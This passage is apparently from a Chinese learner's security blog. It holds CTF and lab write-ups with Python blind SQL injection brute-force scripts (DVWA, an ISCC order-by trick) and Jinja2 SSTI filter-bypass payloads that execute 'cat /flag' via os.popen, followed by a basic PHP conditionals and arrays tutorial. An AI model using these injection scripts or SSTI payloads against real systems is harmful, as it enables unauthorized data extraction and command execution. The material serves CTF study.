headers=headers).text:</span><br><span class="line">                        table_name += n</span><br><span class="line">            print(<span class="string">&#x27;table_name%d:&#x27;</span>%(j+<span class="number">1</span>)+table_name)</span><br></pre></td></tr></table></figure>

<p>查询列名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">columnNum = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    columnNum_payload = <span class="string">&#x27;?id=1\&#x27; and (select count(column_name) from information_schema.columns where table_name=\&#x27;flagishere\&#x27;)=&#x27;</span>+str(j)+<span class="string">&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+columnNum_payload, headers=headers).text:</span><br><span class="line">        columnNum = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&#x27;columnNum: &#x27;</span>+str(columnNum))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆出每个字段名的长度</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,columnNum):</span><br><span class="line">    column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        columnLen_payload = <span class="string">&#x27;?id=1\&#x27; and length(substr((select column_name from information_schema.columns where table_name=\&#x27;flagishere\&#x27; limit &#x27;</span>+str(j)+<span class="string">&#x27;,1),1))=&#x27;</span>+str(i)+<span class="string">&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+columnLen_payload, headers=headers).text:</span><br><span class="line">            columnLen = i</span><br><span class="line">            print(<span class="string">&#x27;column&#x27;</span>+str(j+<span class="number">1</span>)+<span class="string">&#x27;_length: &#x27;</span>+str(columnLen))</span><br><span class="line">          </span><br><span class="line">            <span class="comment"># (2)内部循环爆破每个表的表名</span></span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>,columnLen+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> payloads: <span class="comment"># i在上个循环用过了</span></span><br><span class="line">                    column_payload = <span class="string">&#x27;?id=1\&#x27; and substr((select column_name from information_schema.columns where table_name=\&#x27;flagishere\&#x27; limit &#x27;</span>+str(j)+<span class="string">&#x27;,1),&#x27;</span>+str(m)+<span class="string">&#x27;,1)=\&#x27;&#x27;</span>+str(n)+<span class="string">&#x27;\&#x27; %23&amp;Submit=Submit#&#x27;</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;User ID exists in the database.&#x27;</span> <span class="keyword">in</span> s.get(url+column_payload, headers=headers).text:</span><br><span class="line">                        column_name += n</span><br><span class="line">            print(<span class="string">&#x27;column&#x27;</span>+str(j+<span class="number">1</span>)+<span class="string">&#x27;_name: &#x27;</span>+column_name)</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210127210525.png" alt="img" style="zoom:67%;">

<p>果然最麻烦得不过写脚本</p>
<h4 id="medium："><a href="#medium：" class="headerlink" title="medium："></a>medium：</h4><p>这一次是需要写post类型的脚本</p>
<p>先个坑吧，后面再来补，初学python写脚本太累了，可能也是因为这几天状态不好吧</p>
<h2 id="CSP-BYPASS"><a href="#CSP-BYPASS" class="headerlink" title="CSP BYPASS"></a>CSP BYPASS</h2><p><a href="https://www.cnblogs.com/-zhong/p/10906270.html">https://www.cnblogs.com/-zhong/p/10906270.html</a></p>
<h2 id="JAVA-SCRIPT"><a href="#JAVA-SCRIPT" class="headerlink" title="JAVA SCRIPT"></a>JAVA SCRIPT</h2><p><a href="https://www.cnblogs.com/jojo-feed/p/10206443.html">https://www.cnblogs.com/jojo-feed/p/10206443.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>ISCC括号过滤题复现</title>
    <url>/2021/03/10/ISCC%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="本地数据库建立"><a href="#本地数据库建立" class="headerlink" title="本地数据库建立"></a>本地数据库建立</h2><p>创建数据库:   <a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database test1;</span><br></pre></td></tr></table></figure>

<p>创建表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table &#96;admin&#96;(</span><br><span class="line">&#96;id&#96; int(10) not null primary key auto_increment,</span><br><span class="line">&#96;username&#96; varchar(20) not null,</span><br><span class="line">&#96;password&#96; varchar(32) not null</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>插入数据:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into admin</span><br><span class="line">(username,passowrd)</span><br><span class="line">values</span><br><span class="line">(&quot;admin&quot;,&quot;saddagfkljeaf&quot;)</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210310124615.png" alt="img" style="zoom:67%;">

<h2 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h2><p>测试数据：输入任何数据 发现返回的都是<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210310125133.png" alt="img" style="zoom:67%;"><br>意思就是 flag在password栏里<br>接下来使用sql注入测试一下，发现当我们在单引号后输入=的时候页面回显:illegal input，burp suit爆破测试一下过滤了什么数据：过滤了一些盲注函数包括like regexp，还有where等union查询需要使用的<br>接下来继续测试一下，确定需要使用什么盲注:<br>当我们输入<br>admin’and 1&lt;2#——页面回显是admin也就是我们的用户名，并且是因为此用户名存在才会回显出来<br>当我们输入<br>admin’and 1&gt;2#——页面回显是the content in the password….<br><strong>所以可以确定这里可以使用布尔盲注</strong><br>接下来需要确定使用什么语句进行注入:<br>由于过滤括号，所以无法使用substr等盲注常用函数进行解题<br>这里就要拓展学习一种新方法了:</p>
<h3 id="union-select-order-by盲注"><a href="#union-select-order-by盲注" class="headerlink" title="union select+order by盲注"></a>union select+order by盲注</h3><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210310132159.png" alt="img" style="zoom:67%;">
我们这里从后往前解析，order by 3,2的意思是先排序第三列再排序第二列 我们使用的union     select 插入的数据的第三列的数据如果小于等于admin的第三列，显示的即为我们插入的数据，如果大于显示的即为admin一行的数据，接下来编写盲注脚本:

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s= requests.session()</span><br><span class="line">url=<span class="string">&quot;http://localhost:81/iscc%e6%8b%ac%e5%8f%b7%e8%bf%87%e6%bb%a4%e8%81%94%e7%b3%bb%e9%a2%98.php&quot;</span></span><br><span class="line">payload_try=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">x=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payload_try:</span><br><span class="line">        payload=<span class="string">f&quot;admin&#x27;union select 1,2,&#x27;<span class="subst">&#123;j&#125;</span>&#x27; order by 3,2#&quot;</span></span><br><span class="line">        print(payload)</span><br><span class="line">        data=&#123;<span class="string">&quot;username&quot;</span>:payload,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;sky&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> s.post(url,data).text:</span><br><span class="line">            passwd+=x</span><br><span class="line">            print(passwd)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        x=j</span><br></pre></td></tr></table></figure>

<p>这里有个点需要注意的就是:由于使用的是order by的排序机制，所以<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210310134212.png" alt="img" style="zoom:67%;"><br>程序不会自己终止，就是会一直按最后一位的字母叠加下去，要记得辨识。由于我比较懒，所以密码弄得就是gggggggg，于是就有了上面的结果。<br>而在本题中，密码就是flag。<br>这篇博客似乎有点水哈哈哈哈哈<br>开学也要好好加油哇！</p>
]]></content>
  </entry>
  <entry>
    <title>MAR DASCTF复现</title>
    <url>/2021/04/07/MAR-DASCTF%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">blacklist&lt;/br&gt;   </span><br><span class="line"><span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>\\<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;,&#x27;</span>:<span class="string">&#x27;,&#x27;</span>_<span class="string">&#x27;,&lt;/br&gt;   </span></span><br><span class="line">&#x27;chr&#x27;,&#x27;pop&#x27;,&#x27;class&#x27;,&#x27;base&#x27;,&#x27;mro&#x27;,&#x27;init&#x27;,&#x27;globals&#x27;,&#x27;get&#x27;,&lt;/br&gt;   </span><br><span class="line">&#x27;eval&#x27;,&#x27;exec&#x27;,&#x27;os&#x27;,&#x27;popen&#x27;,&#x27;open&#x27;,&#x27;read&#x27;,&lt;/br&gt;   </span><br><span class="line">&#x27;select&#x27;,&#x27;url_for&#x27;,&#x27;get_flashed_messages&#x27;,&#x27;config&#x27;,&#x27;request&#x27;,&lt;/br&gt;   </span><br><span class="line"><span class="string">&#x27;count&#x27;</span>,<span class="string">&#x27;length&#x27;</span>,<span class="string">&#x27;０&#x27;</span>,<span class="string">&#x27;１&#x27;</span>,<span class="string">&#x27;２&#x27;</span>,<span class="string">&#x27;３&#x27;</span>,<span class="string">&#x27;４&#x27;</span>,<span class="string">&#x27;５&#x27;</span>,<span class="string">&#x27;６&#x27;</span>,<span class="string">&#x27;７&#x27;</span>,<span class="string">&#x27;８&#x27;</span>,<span class="string">&#x27;９&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>&lt;</span><br></pre></td></tr></table></figure>

<p>以上式过滤的关键字，看起来是啥都被过滤了需要绕过:<a id="more"></a></p>
<p>感觉对于函数还是一无所知，决定去啃一下flask框架的文档:<br>好了 ，啃完回来了，直接开始构造payload吧:<br><strong>思路:</strong><br>由于它过滤很多内容，所以我们先要将它过滤的内容以其他形式替换找出来:<br>举个栗子:<br>他过滤的数字我们可以用:𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗来代替<br>我们先来贴一下一个大神的payload，再根据他的构造本题的payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#Author：颖奇L&#39;Amore</span><br><span class="line">&#123;% set xhx &#x3D; ((&#123; &#125;|select()|string()|list()).pop(24)|string())%&#125;  # _</span><br><span class="line">&#123;% set spa &#x3D; ((app.__doc__|list()).pop(102)|string())%&#125;  #空格</span><br><span class="line">&#123;% set pt &#x3D; ((app.__doc__|list()).pop(320)|string())%&#125;  #点</span><br><span class="line">&#123;% set yin &#x3D; ((app.__doc__|list()).pop(337)|string())%&#125;   #单引号</span><br><span class="line">&#123;% set left &#x3D; ((app.__doc__|list()).pop(264)|string())%&#125;   #左括号 （</span><br><span class="line">&#123;% set right &#x3D; ((app.__doc__|list()).pop(286)|string())%&#125;   #右括号）</span><br><span class="line">&#123;% set slas &#x3D; (y1ng.__init__.__globals__.__repr__()|list()).pop(349)%&#125;   #斜线&#x2F;</span><br><span class="line">&#123;% set bu &#x3D; dict(buil&#x3D;aa,tins&#x3D;dd)|join() %&#125;  #builtins</span><br><span class="line">&#123;% set im &#x3D; dict(imp&#x3D;aa,ort&#x3D;dd)|join() %&#125;  #import</span><br><span class="line">&#123;% set sy &#x3D; dict(po&#x3D;aa,pen&#x3D;dd)|join() %&#125;  #popen</span><br><span class="line">&#123;% set os &#x3D; dict(o&#x3D;aa,s&#x3D;dd)|join() %&#125;  #os</span><br><span class="line">&#123;% set ca &#x3D; dict(ca&#x3D;aa,t&#x3D;dd)|join() %&#125;  #cat</span><br><span class="line">&#123;% set flg &#x3D; dict(fl&#x3D;aa,ag&#x3D;dd)|join() %&#125;  #flag</span><br><span class="line">&#123;% set ev &#x3D; dict(ev&#x3D;aa,al&#x3D;dd)|join() %&#125; #eval</span><br><span class="line">&#123;% set red &#x3D; dict(re&#x3D;aa,ad&#x3D;dd)|join()%&#125;  #read</span><br><span class="line">&#123;% set bul &#x3D; xhx*2~bu~xhx*2 %&#125;  #__builtins__</span><br><span class="line"></span><br><span class="line">#拼接起来 __import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()</span><br><span class="line">&#123;% set pld &#x3D; xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right %&#125; </span><br></pre></td></tr></table></figure>

<p>参考:<a href="http://ctf.ieki.xyz/library/ssti.html">http://ctf.ieki.xyz/library/ssti.html</a></p>
<p>这里我就解析一下几个看不太懂的点:<br>1.__doc__的作用按我的理解是，调用app中的文档字符串，然后将它收入list当中，最后使用pop函数调用出来特定的我们需要的字符并使用string()函数将这个变量转化为字符串形式（感觉很巧妙，打开新思路了）。<br>2.接下来就是定义几个dict，然后使用join()函数将其进行拼接<br>3.最后就是实现调用</p>
<p>参考：<a href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>
<p>回看本题:过滤了pop()但是没过滤attr，attr可以获取对象的属性，这里我们可以将其理解为”作用”:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%set a=dict(op=x,p=x)|join()%&#125;<span class="comment">#pop</span></span><br><span class="line">&#123;%set b=(()|select|string|list)|attr(a)(𝟐𝟒)%&#125;<span class="comment">#获取下划线_</span></span><br><span class="line">&#123;%set c=dict(b,b,dict(do=x,c=x)|join,b,b)join()%&#125;<span class="comment">#获取__doc__</span></span><br><span class="line">&#123;%set d=(x|attr(c)|list)|attr(a)(𝟑𝟑𝟕)%&#125;<span class="comment">#单引号，这里的x的意思我理解为是一个中转变量，为了后面的attr(a)做准备</span></span><br><span class="line">&#123;%set e=(x|attr(c)|list)|attr(a)(𝟐𝟔𝟒)%&#125;<span class="comment">#左括号</span></span><br><span class="line">&#123;%set f=(x|attr(c)|list)|attr(a)(𝟐𝟖𝟔)%&#125;<span class="comment">#右括号</span></span><br><span class="line">&#123;%set g=(x|attr(c)|list)|attr(a)(𝟑𝟐𝟎)%&#125;<span class="comment">#点</span></span><br><span class="line">&#123;%set h=(x|attr(c)|list)|attr(a)(𝟏𝟎𝟐)%&#125;<span class="comment">#空格</span></span><br><span class="line">&#123;%set i=(b,b,dict(<span class="keyword">in</span>=x,it=x)|join,b,b)|join()%&#125;<span class="comment">#__init__</span></span><br><span class="line">&#123;%set j=(b,b,dict(glo=x,bals=x)|join,b,b)|join()%&#125;<span class="comment">#__globals__</span></span><br><span class="line">&#123;%set k=(b,b,dict(ge=x,titem=x)|join,b,b)|join()%&#125;<span class="comment">#__getitem__</span></span><br><span class="line">&#123;%set l=(b,b,dict(buil=x,tins=x)|join,b,b)|join()%&#125;<span class="comment">#__builtins__</span></span><br><span class="line">&#123;%set m=(b,b,dict(im=x,port=x)|join,b,b)|join()%&#125;<span class="comment">#__import__</span></span><br><span class="line">&#123;%set n=(x|attr(i)|attr(j)|string|list)|attr(a)(𝟑𝟒𝟗)%&#125;<span class="comment">#引入/</span></span><br><span class="line">&#123;%set o=dict(ev=x,al=x)|join()%&#125;</span><br><span class="line">&#123;%set p=dict(o=x,s=x)|join()%&#125;</span><br><span class="line">&#123;%set q=dict(po=x,pen=x)|join()%&#125;</span><br><span class="line">&#123;%set r=dict(re=x,ad=x)|join()%&#125;</span><br><span class="line">&#123;%set s=(dict(ls=x)|join,h,n,dict(var=x)|join,n,dict(www=x)|join,n,dict(flask=x)|join)|join()%&#125;</span><br><span class="line">&#123;%set t=(m,e,d,p,d,f,g,q,e,d,s,d,f,g,r,e,f)|join()%&#125;<span class="comment">#使用import引入os模块，调用read()方法</span></span><br><span class="line">&#123;%set u=x|attr(i)|attr(j)|attr(k)(l)|attr(k)(o)(t)%&#125;<span class="comment">#熟悉的类继承利用链</span></span><br><span class="line">&#123;&#123;u&#125;&#125;<span class="comment">#执行此链</span></span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h2><p>这次的复现有点迟，好在还是学到了很多东西，感觉ssti注入的最高等级应该就是东拼西凑了吧？可能是我还没遇到更难的题吧</p>
]]></content>
  </entry>
  <entry>
    <title>PHP if switch 数组</title>
    <url>/2020/10/11/PHP-if-switch-%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<p>今天学习的是条件语句</p>
<h2 id="首先是if语句"><a href="#首先是if语句" class="headerlink" title="首先是if语句"></a>首先是if语句</h2><p>听说PHP的内核是C语言编写的，所以很多都和C有点像，这个if语句也是格式是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>（条件）</span><br><span class="line">&#123;</span><br><span class="line">   条件成立时要执行的代码;<span class="comment">//这边有个分号，其他地方没有</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>举个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> $t=<span class="number">22</span>;</span><br><span class="line">  <span class="keyword">if</span>($t&gt;<span class="string">&quot;20&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span><span class="string">&quot;hwg is cool&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果是 hwg is cool                                  <a id="more"></a></p>
<h3 id="然后是if…else语句"><a href="#然后是if…else语句" class="headerlink" title="然后是if…else语句"></a>然后是if…else语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (*条件*)</span><br><span class="line">&#123;</span><br><span class="line">*条件成立时执行的代码;*</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">*条件不成立时执行的代码;</span><br><span class="line">*&#125;</span><br></pre></td></tr></table></figure>

<p>由于和C都差不多，我就懒得举例了，待会再下面找几个题目过来试试；</p>
<h3 id="if…elseif…-else-语句"><a href="#if…elseif…-else-语句" class="headerlink" title="if…elseif….else 语句"></a>if…elseif….else 语句</h3><p>感觉这个是会稍微难一点的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> 条件成立时执行的代码;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (条件)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">elseif</span> 条件成立时执行的代码;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    条件不成立时执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> $t=date(<span class="string">&quot;H&quot;</span>);<span class="comment">//这里的date（&quot;H&quot;）代表的意思是获取当前的小时数</span></span><br><span class="line"><span class="keyword">if</span> ($t&lt;<span class="string">&quot;10&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;have a good morning&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>($t&lt;<span class="string">&quot;20&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">         <span class="keyword">echo</span><span class="string">&quot;have a good dany!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;have a good night&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>补充：function data($value) {}<br>如果是date ，那就是用来获取时间的，h 表示小时，并且是12 小时制的；<br>date(‘Y-m-d H:i:s’, time()); // 2015-8-11 9:05:05，第二个参数不传时默认取当前时间戳<br>date(‘Y’) // 年份 2015，大写Y 是4位，小写为2位<br>date(‘m’) // 月份 8<br>date(‘H’) // 小时 9，大写H 是24小时制，小写为12小时制</p>
<h3 id="switch-case语句"><a href="#switch-case语句" class="headerlink" title="switch case语句"></a>switch case语句</h3><p>和C也差不多，就说一下想让执行到一个case语句就输出，就得</p>
<p>加break才可以想让他执行完一圈都没得输出，只能在最后输出，就要在最后加default（<strong>default</strong> 语句用于不存在匹配（即没有 case 为真）时执行。）<br>举个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$favcolor=<span class="string">&quot;red&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> ($favcolor)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;red&quot;</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你喜欢的颜色是红色!&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;blue&quot;</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你喜欢的颜色是蓝色!&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;green&quot;</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你喜欢的颜色是绿色!&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你喜欢的颜色不是 红, 蓝, 或绿色!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果是 你喜欢的颜色是红色！</p>
<h3 id="接下来再来讲一下之前提过的数组"><a href="#接下来再来讲一下之前提过的数组" class="headerlink" title="接下来再来讲一下之前提过的数组"></a>接下来再来讲一下之前提过的数组</h3><p>首先是<strong>array（）函数</strong>可以用于创建函数<br>格式是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>();</span><br></pre></td></tr></table></figure>

<p>在PHP中，有三种类型的数在 PHP 中，有三种类型的数组：</p>
<ul>
<li><strong>数值数组</strong> - 带有数字 ID 键的数组<br>有两种创建数值数组的方法：</li>
</ul>
<p>第一种方法是自动分配ID键；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$phone=<span class="keyword">array</span>(<span class="string">&quot;vivo&quot;</span>,<span class="string">&quot;iphone&quot;</span>,<span class="string">&quot;hauwei&quot;</span>);<span class="comment">//这样的结果是，vivo会自动变成$phone[0]以此类推</span></span><br></pre></td></tr></table></figure>

<p>值得注意的是，<strong>数组的ID创建是从0开始的</strong></p>
<p>第二种方法是直接创建</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$phone[<span class="number">0</span>]=<span class="string">&quot;vivo&quot;</span>;</span><br><span class="line">$phone[<span class="number">1</span>]=<span class="string">&quot;iphone&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>下面运行下实例:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phone=<span class="keyword">array</span>(<span class="string">&quot;vivo&quot;</span>,<span class="string">&quot;iphone&quot;</span>,<span class="string">&quot;huawei&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;I like&quot;</span> . $phone[<span class="number">0</span>] . <span class="string">&quot;,&quot;</span> .$phone[<span class="number">1</span>] . <span class="string">&quot;,&quot;</span>.$phone[<span class="number">2</span>].<span class="string">&quot;.&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//输出的结果是我喜欢vivo，iphon，huawei。</span></span><br></pre></td></tr></table></figure>

<p><strong>关联数组</strong>-带有制定的键的数组，每个键关联一个值</p>
<p>通俗点说就是，你要给三个变量都赋予一个相同属性的值，就可以直接用关联数组<br>比如说</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$age=<span class="keyword">array</span>(<span class="string">&quot;Peter&quot;</span>=&gt;<span class="string">&quot;35&quot;</span>,<span class="string">&quot;Ben&quot;</span>=&gt;<span class="string">&quot;37&quot;</span>,<span class="string">&quot;Joe&quot;</span>=&gt;<span class="string">&quot;43&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这样的话，每个人都被赋予了年龄这个属性值<br>举个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$age=<span class="keyword">array</span>(<span class="string">&quot;Peter&quot;</span>=&gt;<span class="string">&quot;35&quot;</span>,<span class="string">&quot;Ben&quot;</span>=&gt;<span class="string">&quot;37&quot;</span>,<span class="string">&quot;Joe&quot;</span>=&gt;<span class="string">&quot;43&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Peter is &quot;</span> . $age[<span class="string">&#x27;Peter&#x27;</span>] . <span class="string">&quot; years old.&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//输出的结果是peter is 35years old.</span></span><br></pre></td></tr></table></figure>

<p>这里有提到一个<strong>获取数组的长度-count()函数</strong><br>count()函数用于返回数组的长度（元素的数量）<br>直接放个例子吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cars=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> count($cars);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出的结果是3，原来，这个count输出的是array这个函数数组中所包含的<strong>元素数量</strong></p>
<h3 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h3><p>遍历并打印<strong>数值数组</strong>中的所有值，可以使用for循环。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phone=<span class="keyword">array</span>(<span class="string">&quot;vivo&quot;</span>,<span class="string">&quot;iphone&quot;</span>,<span class="string">&quot;huawei&quot;</span>);</span><br><span class="line">$arraylenth=count($iphone);<span class="comment">//这边的count（$iphone）就可以直接数出iphone的数组元素长度了</span></span><br><span class="line"><span class="keyword">for</span>($x=<span class="number">0</span>;$x&lt;$arraylength;x++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> $phone[$x]；</span><br><span class="line">    <span class="keyword">echo</span> &lt;<span class="string">&quot;br&quot;</span>&gt;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出的结果是 vivo iphone huawei<br>遍历并打印<strong>关联数组</strong><br>可以使用foreach循环，这里就需要说明一下一下foreach循环了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($array <span class="keyword">as</span> $value)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($array <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个都是foreach循环<br>第一个是，用官方的话来说是，没进行一次循环，当前数组元素的值就会被赋值给$value变量（数组指针会逐一往下移动），在进行下一次循环时，将会看到数组中的键与值<br>我的理解是，（把概念打一遍，突然感觉自己的想法就是概念的想法？），数组的<strong>值</strong>都会被<strong>按顺序</strong>以value变量为载体输出</p>
<p>而第二个是，用官方的话来说，每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。<br>我的理解是，他是在上一种的基础上，多增加了一个$key变量，然后将数组的序号或者代称以key的形式输出，，然后另一个value效果和上一个一样就不说了。<br><strong>然后这个key和value是可以替换成其他字母的</strong></p>
<p>例：</p>
